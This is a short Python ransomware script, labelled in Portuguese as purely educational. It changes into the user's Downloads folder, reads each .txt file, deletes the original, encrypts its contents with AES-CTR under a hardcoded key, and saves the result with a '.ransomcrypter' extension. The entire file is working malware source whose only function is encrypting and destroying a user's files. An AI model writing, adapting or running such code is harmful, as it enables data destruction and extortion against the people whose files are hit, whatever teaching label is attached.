"""
Ransomware - 0.0.0.0

By Carlos Henrique Barros Silva Campos

OBS: Script para total didática.
"""
import os
import glob
import time
import pyaes
from pathlib import Path
#a=argv[1]
lst_arq = ["*.txt"]
lst_past = ["Downloads"]


print('Criptografando')
time.sleep(3)

def criptografando():
    for files in lst_arq:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_file}')
            key = b"102efd86a2bec382e7945002e53505a7"  # 16 byts key - chave
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvando arquivo novo (.ransomcrypter)

            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

for i in lst_past:
    try:
        desktop = Path.home() / i
        #download = Path.home() / "Downloads"
    except Exception:
        pass
    os.chdir(desktop)
    criptografando()


